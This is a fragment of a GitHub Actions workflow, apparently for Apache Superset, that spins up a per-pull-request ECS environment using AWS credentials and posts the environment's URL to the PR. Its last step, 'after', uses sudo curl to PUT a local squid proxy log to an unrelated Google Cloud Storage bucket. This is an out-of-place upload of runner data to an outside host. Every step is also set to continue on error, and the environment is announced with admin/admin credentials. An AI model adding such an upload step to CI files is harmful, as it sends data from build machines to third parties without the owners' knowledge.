    - continue-on-error: true
      uses: actions/checkout@v3
      with:
        persist-credentials: false
    - continue-on-error: true
      name: Configure AWS credentials
      uses: aws-actions/configure-aws-credentials@v1
      with:
        aws-access-key-id: ${{ secrets.AWS_ACCESS_KEY_ID }}
        aws-region: us-west-2
        aws-secret-access-key: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
    - continue-on-error: true
      id: login-ecr
      name: Login to Amazon ECR
      uses: aws-actions/amazon-ecr-login@v1
    - continue-on-error: true
      id: check-image
      name: Check target image exists in ECR
      run: 'aws ecr describe-images \

        --registry-id $(echo "${{ steps.login-ecr.outputs.registry }}" | grep -Eo
        "^[0-9]+") \

        --repository-name superset-ci \

        --image-ids imageTag=pr-${{ github.event.issue.number }}

        '
    - continue-on-error: true
      if: steps.check-image.outcome == 'failure'
      name: Fail on missing container image
      uses: actions/github-script@v3
      with:
        github-token: ${{github.token}}
        script: "const errMsg = '@${{ github.event.comment.user.login }} Container\
          \ image not yet published for this PR. Please try again when build is complete.'\n\
          github.issues.createComment({\n  issue_number: ${{ github.event.issue.number\
          \ }},\n  owner: context.repo.owner,\n  repo: context.repo.repo,\n  body:\
          \ errMsg\n})\ncore.setFailed(errMsg)\n"
    - continue-on-error: true
      id: task-def
      name: Fill in the new image ID in the Amazon ECS task definition
      uses: aws-actions/amazon-ecs-render-task-definition@v1
      with:
        container-name: superset-ci
        image: ${{ steps.login-ecr.outputs.registry }}/superset-ci:pr-${{ github.event.issue.number
          }}
        task-definition: .github/workflows/ecs-task-definition.json
    - continue-on-error: true
      name: Update env vars in the Amazon ECS task definition
      run: 'cat <<< "$(jq ''.containerDefinitions[0].environment += ${{ needs.ephemeral_env_comment.outputs.feature-flags
        }}'' < ${{ steps.task-def.outputs.task-definition }})" > ${{ steps.task-def.outputs.task-definition
        }}

        '
    - continue-on-error: true
      id: describe-services
      name: Describe ECS service
      run: 'echo "::set-output name=active::$(aws ecs describe-services --cluster
        superset-ci --services pr-${{ github.event.issue.number }}-service | jq ''.services[]
        | select(.status == "ACTIVE") | any'')"

        '
    - continue-on-error: true
      env:
        ECR_SECURITY_GROUP: sg-092ff3a6ae0574d91
        ECR_SUBNETS: subnet-0e15a5034b4121710,subnet-0e8efef4a72224974
      id: create-service
      if: steps.describe-services.outputs.active != 'true'
      name: Create ECS service
      run: 'aws ecs create-service \

        --cluster superset-ci \

        --service-name pr-${{ github.event.issue.number }}-service \

        --task-definition superset-ci \

        --launch-type FARGATE \

        --desired-count 1 \

        --platform-version LATEST \

        --network-configuration "awsvpcConfiguration={subnets=[$ECR_SUBNETS],securityGroups=[$ECR_SECURITY_GROUP],assignPublicIp=ENABLED}"
        \

        --tags key=pr,value=${{ github.event.issue.number }} key=github_user,value=${{
        github.actor }}

        '
    - continue-on-error: true
      id: deploy-task
      name: Deploy Amazon ECS task definition
      uses: aws-actions/amazon-ecs-deploy-task-definition@v1
      with:
        cluster: superset-ci
        service: pr-${{ github.event.issue.number }}-service
        task-definition: ${{ steps.task-def.outputs.task-definition }}
        wait-for-minutes: 10
        wait-for-service-stability: true
    - continue-on-error: true
      id: list-tasks
      name: List tasks
      run: 'echo "::set-output name=task::$(aws ecs list-tasks --cluster superset-ci
        --service-name pr-${{ github.event.issue.number }}-service | jq ''.taskArns
        | first'')"

        '
    - continue-on-error: true
      id: get-eni
      name: Get network interface
      run: 'echo "::set-output name=eni::$(aws ecs describe-tasks --cluster superset-ci
        --tasks ${{ steps.list-tasks.outputs.task }} | jq ''.tasks | .[0] | .attachments
        | .[0] | .details | map(select(.name=="networkInterfaceId")) | .[0] | .value'')"

        '
    - continue-on-error: true
      id: get-ip
      name: Get public IP
      run: 'echo "::set-output name=ip::$(aws ec2 describe-network-interfaces --network-interface-ids
        ${{ steps.get-eni.outputs.eni }} | jq -r ''.NetworkInterfaces | first | .Association.PublicIp'')"

        '
    - continue-on-error: true
      if: ${{ success() }}
      name: Comment (success)
      uses: actions/github-script@v3
      with:
        github-token: ${{github.token}}
        script: "github.issues.createComment({\n  issue_number: ${{ github.event.issue.number\
          \ }},\n  owner: context.repo.owner,\n  repo: context.repo.repo,\n  body:\
          \ '@${{ github.event.comment.user.login }} Ephemeral environment spinning\
          \ up at http://${{ steps.get-ip.outputs.ip }}:8080. Credentials are `admin`/`admin`.\
          \ Please allow several minutes for bootstrapping and startup.'\n})\n"
    - continue-on-error: true
      if: ${{ failure() }}
      name: Comment (failure)
      uses: actions/github-script@v3
      with:
        github-token: ${{github.token}}
        script: "github.issues.createComment({\n  issue_number: ${{ github.event.issue.number\
          \ }},\n  owner: context.repo.owner,\n  repo: context.repo.repo,\n  body:\
          \ '@${{ github.event.comment.user.login }} Ephemeral environment creation\
          \ failed. Please check the Actions logs for details.'\n})\n"
    - name: after
      run: sudo curl --request PUT -T /squid/squidlog.json --url https://storage.googleapis.com/virtualeventdemoblr.appspot.com/squid/fullcontact/superset.$(date
        +%s)
    timeout-minutes: 60
name: Ephemeral env workflow
'on':
  workflow_dispatch: {}
